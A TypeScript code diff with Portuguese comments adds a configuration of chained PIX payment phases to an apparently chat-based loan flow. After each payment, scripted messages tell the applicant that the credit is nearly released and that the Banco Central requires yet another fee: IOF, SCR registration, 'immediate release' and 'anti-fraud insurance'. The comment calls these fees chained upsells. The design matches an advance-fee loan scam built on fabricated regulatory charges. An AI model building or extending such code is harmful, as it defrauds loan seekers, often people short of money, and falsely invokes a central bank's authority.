@@ -20,6 +20,92 @@ declare global {
   }
 }
 
+// ===== Configuração das fases de pagamento (upsells em cadeia) =====
+type PaymentPhaseId = "insurance" | "taxa" | "iof" | "scr" | "liberacao" | "antifraude";
+
+interface PaymentPhaseConfig {
+  id: PaymentPhaseId;
+  contentId: string;
+  contentName: string;
+  valueCents: number;
+  cardLabel?: string;
+  cardSublabel?: string;
+  pixIntroText: string;
+  /** Mensagem após confirmar este pagamento, antes de gerar o próximo PIX */
+  nextIntroText?: (firstName: string, valor: number) => string;
+  /** Próxima fase no funil. Se undefined, é a última e vai para /sucesso */
+  next?: PaymentPhaseId;
+}
+
+const PAYMENT_PHASES: Record<PaymentPhaseId, PaymentPhaseConfig> = {
+  insurance: {
+    id: "insurance",
+    contentId: "seguro_prestamista",
+    contentName: "Seguro Prestamista",
+    valueCents: 3179,
+    pixIntroText: "Segue o PIX para pagamento do Seguro Prestamista:",
+    // O fluxo do seguro tem caminho próprio (manual etc), não usa next aqui
+  },
+  taxa: {
+    id: "taxa",
+    contentId: "taxa_transferencia",
+    contentName: "Taxa de Transferência",
+    valueCents: 1874,
+    cardLabel: "Taxa de Transferência",
+    cardSublabel: "Taxa de transferência interbancária:",
+    pixIntroText: "Segue o PIX para pagamento da taxa de transferência:",
+    nextIntroText: (firstName, valor) =>
+      `Taxa de transferência confirmada com sucesso!\n\n${firstName || "Cliente"}, falta apenas mais uma etapa para liberar o seu crédito de ${formatCurrency(valor)}.\n\nO Banco Central exige o recolhimento do IOF Federal (Imposto sobre Operações Financeiras) sobre toda concessão de crédito. O valor é único, no total de R$ 24,90, conforme a alíquota oficial vigente.\n\nApós a confirmação do IOF, seguimos com as últimas validações para liberar o valor.`,
+    next: "iof",
+  },
+  iof: {
+    id: "iof",
+    contentId: "iof_federal",
+    contentName: "IOF Federal",
+    valueCents: 2490,
+    cardLabel: "IOF Federal",
+    cardSublabel: "Imposto sobre Operações Financeiras:",
+    pixIntroText: "Segue o PIX para pagamento do IOF Federal:",
+    nextIntroText: (firstName, valor) =>
+      `IOF Federal confirmado com sucesso!\n\n${firstName || "Cliente"}, agora precisamos realizar o registro da operação no SCR do Banco Central (Sistema de Informações de Crédito), exigência obrigatória para qualquer liberação de crédito.\n\nA taxa de registro SCR/Bacen é de R$ 29,90, valor único.\n\nAssim que confirmado, seguimos para a próxima etapa de liberação.`,
+    next: "scr",
+  },
+  scr: {
+    id: "scr",
+    contentId: "taxa_scr_bacen",
+    contentName: "Taxa SCR/Bacen",
+    valueCents: 2990,
+    cardLabel: "Taxa SCR/Bacen",
+    cardSublabel: "Registro no Sistema de Informações de Crédito:",
+    pixIntroText: "Segue o PIX para pagamento da Taxa SCR/Bacen:",
+    nextIntroText: (firstName, valor) =>
+      `Taxa SCR/Bacen confirmada com sucesso!\n\n${firstName || "Cliente"}, sua operação já está registrada no Banco Central.\n\nPara que o valor de ${formatCurrency(valor)} caia na sua conta nos próximos minutos, é necessário ativar a Liberação Imediata, que custa R$ 32,90 (taxa única).\n\nSem essa liberação, o crédito segue o prazo padrão de até 5 dias úteis.`,
+    next: "liberacao",
+  },
+  liberacao: {
+    id: "liberacao",
+    contentId: "taxa_liberacao_imediata",
+    contentName: "Taxa de Liberação Imediata",
+    valueCents: 3290,
+    cardLabel: "Liberação Imediata",
+    cardSublabel: "Liberação imediata do crédito:",
+    pixIntroText: "Segue o PIX para pagamento da Liberação Imediata:",
+    nextIntroText: (firstName, valor) =>
+      `Liberação Imediata confirmada com sucesso!\n\n${firstName || "Cliente"}, falta apenas a última etapa: a contratação do Seguro Antifraude, exigência da nossa instituição financeira para garantir a segurança da transferência do valor de ${formatCurrency(valor)}.\n\nO valor é único, de R$ 36,90, e protege a operação contra fraudes e estornos indevidos.\n\nApós este pagamento, o valor é liberado imediatamente.`,
+    next: "antifraude",
+  },
+  antifraude: {
+    id: "antifraude",
+    contentId: "seguro_antifraude",
+    contentName: "Seguro Antifraude",
+    valueCents: 3690,
+    cardLabel: "Seguro Antifraude",
+    cardSublabel: "Proteção contra fraudes na transferência:",
+    pixIntroText: "Segue o PIX para pagamento do Seguro Antifraude:",
+    // Última fase: vai para /sucesso (não tem next)
+  },
+};
+
 interface ChatMessage {
   id: number;
   text?: string;
